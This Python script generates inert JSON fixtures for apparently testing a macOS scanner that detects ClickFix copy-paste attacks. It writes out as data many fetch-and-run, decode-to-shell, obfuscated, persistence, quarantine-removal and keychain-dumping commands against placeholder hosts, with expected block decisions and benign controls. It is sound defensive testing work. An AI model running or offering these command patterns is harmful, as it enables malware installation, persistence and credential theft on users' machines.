"""Generate deterministic inert JSON fixtures. This module never executes fixture text."""
from __future__ import annotations
import base64, gzip, json
from pathlib import Path

ROOT=Path(__file__).parent
MARKER="printf 'MSAA_CLICKFIX_TEST\\n'"
B64=base64.b64encode(MARKER.encode()).decode()
DOUBLE=base64.b64encode(B64.encode()).decode()
GZIP=base64.b64encode(gzip.compress(MARKER.encode(),mtime=0)).decode()
HEX=MARKER.encode().hex()
FORBIDDEN=["network_access","shell_execution","decoded_content_execution","credential_access","persistence_write","security_setting_change","filesystem_escape"]

def f(fid,name,category,command,decision="block",score=7,rules=(),**extra):
    value={"fixture_id":fid,"name":name,"category":category,"description":name+" supplied only as inert scanner data.","command_text":command,"paste_origin":extra.pop("paste_origin",True),"multiline":extra.pop("multiline","\n" in command.rstrip("\n")),"trailing_newline":extra.pop("trailing_newline",command.endswith("\n")),"shell":extra.pop("shell","zsh"),"expected_decision":decision,"minimum_score":score,"required_rule_ids":list(rules),"forbidden_side_effects":FORBIDDEN,"campaign_relevance":extra.pop("campaign_relevance",["ClickFix copy-paste execution"]),"notes":extra.pop("notes","No fixture content may be executed."),**extra}
    return value

groups={}
groups["simple"]=[
f("CF-SIMPLE-001","Network retrieval piped to zsh","simple","curl -fsSL https://example.invalid/update | zsh",rules=["network_to_interpreter"]),
f("CF-SIMPLE-002","Network retrieval piped to Bash","simple","curl -fsSL https://example.invalid/fix | bash",rules=["network_to_interpreter"],shell="bash"),
f("CF-SIMPLE-003","Downloader piped to sh","simple","wget -qO- https://example.invalid/install | sh",rules=["network_to_interpreter"],shell="sh"),
f("CF-SIMPLE-004","Download followed by shell execution","simple","curl -fsSL https://example.invalid/fix -o /tmp/msaa-test.sh ; zsh /tmp/msaa-test.sh",rules=["download_stage_execute"]),
f("CF-SIMPLE-005","Clipboard piped to shell","simple","pbpaste | zsh",rules=["clipboard_to_interpreter"]),
f("CF-SIMPLE-006","Clipboard executed with shell -c","simple",'zsh -c "$(pbpaste)"',rules=["clipboard_to_interpreter","command_substitution"]),
f("CF-SIMPLE-007","Network content executed by shell -c","simple",'zsh -c "$(curl -fsSL https://example.invalid/fix)"',rules=["network_to_interpreter","shell_c_execution"]),
f("CF-SIMPLE-008","Network retrieval passed to eval","simple",'eval "$(curl -fsSL https://example.invalid/fix)"',rules=["network_to_eval","dynamic_execution"]),]
groups["encoding"]=[
f("CF-ENC-001","Harmless Base64 content decoded into zsh","encoding",f"printf '%s' '{B64}' | base64 -D | zsh",rules=["decoded_content_to_interpreter","static_decoded_content"]),
f("CF-ENC-002","Base64 decoded into Bash","encoding",f"echo '{B64}' | base64 --decode | bash",rules=["decoded_content_to_interpreter"]),
f("CF-ENC-003","OpenSSL Base64 decoding into shell","encoding",f"printf '%s' '{B64}' | openssl base64 -d | sh",rules=["decoded_content_to_interpreter"]),
f("CF-ENC-004","Hexadecimal reconstruction into zsh","encoding",f"printf '{HEX}' | xxd -r -p | zsh",rules=["decoded_content_to_interpreter"]),
f("CF-ENC-005","Decoder output captured and evaluated","encoding",f'''x="$(printf '%s' '{B64}' | base64 -D)" ; eval "$x"''',rules=["static_decoded_content","dynamic_execution"]),
f("CF-ENC-006","Nested encoding","encoding",f"printf '%s' '{DOUBLE}' | base64 -D | base64 -D | zsh",rules=["decoded_content_to_interpreter","multiple_decode_layers"]),
f("CF-ENC-007","Base64 plus Gzip plus eval","encoding",f'''eval "$(printf '%s' '{GZIP}' | base64 -D | gzip -d)"''',rules=["static_decoded_content","dynamic_execution"]),]
groups["obfuscation"]=[
f("CF-OBF-001","Fragmented downloader name","obfuscation",'''c='cu' ; r='rl' ; "$c$r" -fsSL https://example.invalid/fix | zsh''',"warn",4,["reconstructed_executable"]),
f("CF-OBF-002","Fragmented interpreter name","obfuscation",'''s='z' ; h='sh' ; curl -fsSL https://example.invalid/fix | "$s$h"''',rules=["network_to_interpreter","reconstructed_executable"]),
f("CF-OBF-003","Escaped executable name","obfuscation",r"c\u\r\l -fsSL https://example.invalid/fix | zsh",rules=["network_to_interpreter","execution_obfuscation_escaped_name"]),
f("CF-OBF-004","printf reconstruction","obfuscation","$(printf '%s%s' cu rl) -fsSL https://example.invalid/fix | zsh",rules=["network_to_interpreter","command_name_reconstruction"]),
f("CF-OBF-005","Reverse-string reconstruction","obfuscation","name='lruc' ; printf '%s' \"$name\" | rev", "warn",4,["execution_obfuscation"]),
f("CF-OBF-006","Character translation reconstruction","obfuscation","printf 'dvsm' | tr 'd-v' 'c-u'", "warn",4,["execution_obfuscation"]),
f("CF-OBF-007","Environment-variable interpreter","obfuscation",'''SHELL_RUNNER=zsh ; curl -fsSL https://example.invalid/fix | "$SHELL_RUNNER"''',rules=["network_to_interpreter","environment_indirection"]),
f("CF-OBF-008","Absolute-path binaries","obfuscation","/usr/bin/curl -fsSL https://example.invalid/fix | /bin/zsh",rules=["network_to_interpreter"]),
f("CF-OBF-009","Quoted command fragments","obfuscation",'''"c""u""r""l" -fsSL https://example.invalid/fix | "z""s""h"''',rules=["network_to_interpreter"]),
f("CF-OBF-010","Unicode whitespace","obfuscation","curl\u00a0-fsSL\u00a0https://example.invalid/fix\u00a0|\u00a0zsh",rules=["network_to_interpreter","execution_obfuscation_unicode"]),
f("CF-OBF-011","Zero-width insertion","obfuscation","cu\u200brl -fsSL https://example.invalid/fix | zsh",rules=["network_to_interpreter","execution_obfuscation_unicode"]),
f("CF-OBF-012","ANSI controls","obfuscation","\u001b[31mcurl -fsSL https://example.invalid/fix | zsh\u001b[0m",rules=["network_to_interpreter","execution_obfuscation_control"]),]
groups["multiline"]=[
f("CF-PASTE-001","Command ending in newline","multiline","curl -fsSL https://example.invalid/fix | zsh\n",rules=["network_to_interpreter"],trailing_newline=True),
f("CF-PASTE-002","Multiline staged execution","multiline","curl -fsSL https://example.invalid/fix -o /tmp/msaa-stage\nchmod +x /tmp/msaa-stage\n/tmp/msaa-stage",rules=["download_stage_execute"]),
f("CF-PASTE-003","Benign line then suspicious","multiline","echo 'Checking browser configuration'\ncurl -fsSL https://example.invalid/fix | zsh",rules=["network_to_interpreter"]),
f("CF-PASTE-004","Comments then suspicious","multiline","# Browser verification repair\n# Do not close this window\ncurl -fsSL https://example.invalid/fix | zsh",rules=["network_to_interpreter"]),
f("CF-PASTE-005","Backslash continuation","multiline","curl -fsSL \\\nhttps://example.invalid/fix \\\n| zsh",rules=["network_to_interpreter"]),
f("CF-PASTE-006","Split paste final buffer","multiline","curl -fsSL https://example.invalid/fix | zsh",rules=["network_to_interpreter"],notes="Harness models two paste events but scans the complete final buffer at accept-line."),
f("CF-PASTE-007","Variable URL","multiline",'u=https://example.invalid/fix\ncurl -fsSL "$u" | zsh',rules=["network_to_interpreter"]),]
groups["staging"]=[
f("CF-STAGE-001","Temporary script staging","staging","curl -fsSL https://example.invalid/fix -o /tmp/.update ; chmod 700 /tmp/.update ; /tmp/.update",rules=["download_stage_execute"]),
f("CF-STAGE-002","User cache staging","staging",'''curl -fsSL https://example.invalid/fix -o "$HOME/Library/Caches/.helper" ; chmod +x "$HOME/Library/Caches/.helper" ; "$HOME/Library/Caches/.helper"''',rules=["download_stage_execute"]),
f("CF-STAGE-003","Static randomized temp name","staging",'''p=/tmp/.msaa-TEST-RANDOM ; curl -fsSL https://example.invalid/fix -o "$p" ; chmod +x "$p" ; "$p"''',rules=["download_stage_execute"]),
f("CF-STAGE-004","Download then source","staging","curl -fsSL https://example.invalid/fix -o /tmp/msaa-source ; source /tmp/msaa-source",rules=["download_stage_execute","downloaded_content_sourced"]),
f("CF-STAGE-005","Download then dot-source","staging","curl -fsSL https://example.invalid/fix -o /tmp/msaa-source ; . /tmp/msaa-source",rules=["download_stage_execute","downloaded_content_sourced"]),
f("CF-STAGE-006","Fileless temporary pipe","staging","curl -fsSL https://example.invalid/fix | tee /tmp/msaa-stage | zsh",rules=["network_to_interpreter"]),]
groups["applescript"]=[
f("CF-AS-001","osascript shell execution","applescript",'''osascript -e 'do shell script "curl -fsSL https://example.invalid/fix | zsh"' ''',rules=["applescript_shell_execution"]),
f("CF-AS-002","AppleScript encoded shell text","applescript",f'''osascript -e 'do shell script "printf {B64} | base64 -D | zsh"' ''',rules=["applescript_shell_execution","decoded_content_to_interpreter"]),
f("CF-AS-003","AppleScript URL scheme","applescript","applescript://SAFE_TEST_PLACEHOLDER",rules=["applescript_url_scheme"]),
f("CF-AS-004","Script Editor execution observation","applescript","<SIMULATED_SCRIPT_EDITOR_TO_SHELL>",rules=["script_editor_to_shell","clickfix_terminal_bypass"],simulation=True,simulated_decision="block",simulated_rule_ids=["script_editor_to_shell","clickfix_terminal_bypass"]),
f("CF-AS-005","open AppleScript URL","applescript","open 'applescript://SAFE_TEST_PLACEHOLDER'",rules=["applescript_url_scheme"]),]
groups["persistence"]=[
f("CF-PERSIST-001","LaunchAgent path creation","persistence",'''printf '<SAFE_PLIST_PLACEHOLDER>' > "$HOME/Library/LaunchAgents/com.example.invalid.test.plist"''',"warn",4,["launchagent_write"]),
f("CF-PERSIST-002","Downloaded LaunchAgent","persistence",'''curl -fsSL https://example.invalid/test.plist -o "$HOME/Library/LaunchAgents/com.example.invalid.test.plist"''',rules=["downloaded_persistence","launchagent_write"]),
f("CF-PERSIST-003","LaunchAgent bootstrap","persistence",'''launchctl bootstrap "gui/$UID" "$HOME/Library/LaunchAgents/com.example.invalid.test.plist"''',"warn",4,["persistence_activation"]),
f("CF-PERSIST-004","Download and activate persistence","persistence",'''curl -fsSL https://example.invalid/test.plist -o "$HOME/Library/LaunchAgents/com.example.invalid.test.plist" ; launchctl bootstrap "gui/$UID" "$HOME/Library/LaunchAgents/com.example.invalid.test.plist"''',rules=["downloaded_persistence","persistence_activation"]),
f("CF-PERSIST-005","Cron placeholder","persistence","crontab - <SAFE_CRON_PLACEHOLDER>","warn",4,["persistence_creation"]),]
groups["security_bypass"]=[
f("CF-BYPASS-001","Quarantine removal","security_bypass","xattr -d com.apple.quarantine /tmp/example.invalid.app","warn",4,["security_control_weakening"]),
f("CF-BYPASS-002","Recursive quarantine removal","security_bypass","xattr -dr com.apple.quarantine /tmp/example.invalid.app",rules=["security_control_weakening"]),
f("CF-BYPASS-003","Download quarantine removal execute","security_bypass","curl -fsSL https://example.invalid/app -o /tmp/example.invalid.app ; xattr -dr com.apple.quarantine /tmp/example.invalid.app ; /tmp/example.invalid.app",rules=["security_control_weakening"]),
f("CF-BYPASS-004","Gatekeeper disable intent","security_bypass","<ATTEMPT_DISABLE_GATEKEEPER>",rules=["gatekeeper_disable_intent","destructive_security_change"]),
f("CF-BYPASS-005","SIP disable intent","security_bypass","<ATTEMPT_DISABLE_SIP>",rules=["sip_disable_intent","destructive_security_change"]),
f("CF-BYPASS-006","TCC modification intent","security_bypass","<ATTEMPT_MODIFY_TCC_DATABASE>",rules=["tcc_tampering_intent"]),]
symbolic=[("001","DELETE_ROOT_FILESYSTEM","destructive_filesystem_intent"),("002","DELETE_USER_HOME","destructive_filesystem_intent"),("003","ERASE_SYSTEM_VOLUME","destructive_disk_intent"),("004","OVERWRITE_DISK_DEVICE","raw_disk_write_intent"),("005","RECURSIVE_PERMISSION_DESTRUCTION","destructive_permission_change"),("006","DISABLE_SECURITY_CONTROLS_AND_DELETE_DATA","compound_destructive_intent"),("007","FORK_OR_RESOURCE_EXHAUSTION","denial_of_service_intent"),("008","MASS_PROCESS_TERMINATION","destructive_process_control")]
groups["destructive_symbolic"]=[f("CF-DESTRUCT-"+n,title.replace("_"," ").title(),"destructive_symbolic",f"<ATTEMPT_{title}>",rules=[rule]) for n,title,rule in symbolic]
cred=[("001","security find-generic-password -w -s example.invalid","keychain_secret_output","warn",4),("002","security dump-keychain","keychain_dump","block",6),("003","<ATTEMPT_READ_BROWSER_LOGIN_DATABASE>","browser_credential_access","block",7),("004","<ATTEMPT_READ_BROWSER_COOKIES>","browser_cookie_access","block",7),("005","<ATTEMPT_ARCHIVE_SSH_KEYS>","ssh_key_collection","block",7),("006","<ATTEMPT_COLLECT_CLOUD_CREDENTIALS>","cloud_credential_collection","block",7),("007","<ATTEMPT_COLLECT_WALLET_DATA>","wallet_data_collection","block",7),("008","<ATTEMPT_ARCHIVE_AND_EXFILTRATE_USER_DATA>","archive_creation","block",7)]
groups["credential_access_symbolic"]=[f("CF-CRED-"+n,"Credential intent "+n,"credential_access",cmd,decision,score,[rule]) for n,cmd,rule,decision,score in cred]
drive_rules=[["browser_to_terminal_transition","clipboard_to_terminal","network_to_interpreter"],["clickfix_social_engineering_context","trailing_newline"],["malvertising_context","network_to_interpreter"],["crashfix_context","browser_to_terminal_transition"],["browser_to_script_editor","applescript_url_scheme","shell_execution"],["unsigned_app_to_shell","quarantined_application_execution","network_stage"],["drag_to_terminal","downloaded_file_execution"]]
groups["driveby_simulations"]=[f(f"CF-DRIVEBY-{i:03d}","Drive-by simulation "+str(i),"driveby",f"<SIMULATED_DRIVEBY_{i}>",rules=rules,simulation=True,simulated_decision="block",simulated_rule_ids=rules,campaign_relevance=["Fake browser verification","Malvertising redirect"]) for i,rules in enumerate(drive_rules,1)]
chains=[
("CF-CHAIN-001",["curl -fsSL https://example.invalid/fix -o /tmp/msaa-stage","chmod +x /tmp/msaa-stage","/tmp/msaa-stage"],["correlated_download_stage_execute","same_path_correlation"]),
("CF-CHAIN-002",[f"printf '%s' '{B64}' > /tmp/msaa-data","base64 -D /tmp/msaa-data > /tmp/msaa-script","zsh /tmp/msaa-script"],["correlated_decode_execute"]),
("CF-CHAIN-003",["curl -fsSL https://example.invalid/test.plist -o /tmp/msaa.plist","copy <SAFE_PLACEHOLDER> $HOME/Library/LaunchAgents/com.example.invalid.test.plist","launchctl bootstrap gui/TEST $HOME/Library/LaunchAgents/com.example.invalid.test.plist"],["correlated_downloaded_persistence"]),
("CF-CHAIN-004",["curl -fsSL https://example.invalid/app -o /tmp/example.invalid.app","xattr -d com.apple.quarantine /tmp/example.invalid.app","/tmp/example.invalid.app"],["correlated_security_bypass_execution"]),
("CF-CHAIN-005",["curl -fsSL https://example.invalid/data -o /tmp/msaa-data","base64 -D /tmp/msaa-data > /tmp/msaa-script","eval <SAFE_DECODED_VARIABLE_PLACEHOLDER>"],["correlated_network_decode_execute"]),]
groups["chain_correlation"]=[f(fid,"Split command correlation","chain_correlation","<SEQUENCE_ONLY>",rules=rules,event_sequence=events) for fid,events,rules in chains]
benign=[("001","curl -fsSL https://example.invalid/data.json -o /tmp/msaa-data.json"),("002","printf '%s' 'TVNBQV9URVNUCg==' | base64 -D"),("003",'''python3 -c 'print("MSAA test")' '''),("004",'''osascript -e 'display notification "MSAA test"' '''),("005","chmod 600 /tmp/msaa-owned-test-file"),("006","xattr -l /tmp/example.invalid.app"),("007","launchctl list"),("008","security find-generic-password -s example.invalid"),("009","git clone https://example.invalid/repository.git"),("010","brew install example-package"),("011","example_function() { printf 'MSAA test\\n'; }"),("012","cat <<'JSON'\n{\"harmless\":\""+"x"*300+"\"}\nJSON")]
groups["benign_controls"]=[f("CF-BENIGN-"+n,"Benign control "+n,"benign",cmd,"allow",0,[],paste_origin=True) for n,cmd in benign]

def main():
    ROOT.mkdir(parents=True,exist_ok=True)
    all_items=[]
    for name,items in groups.items():
        all_items.extend(items);(ROOT/(name+".json")).write_text(json.dumps(items,indent=2,ensure_ascii=True)+"\n",encoding="utf-8")
    (ROOT/"fixtures.json").write_text(json.dumps(all_items,indent=2,ensure_ascii=True)+"\n",encoding="utf-8")
if __name__=="__main__":main()
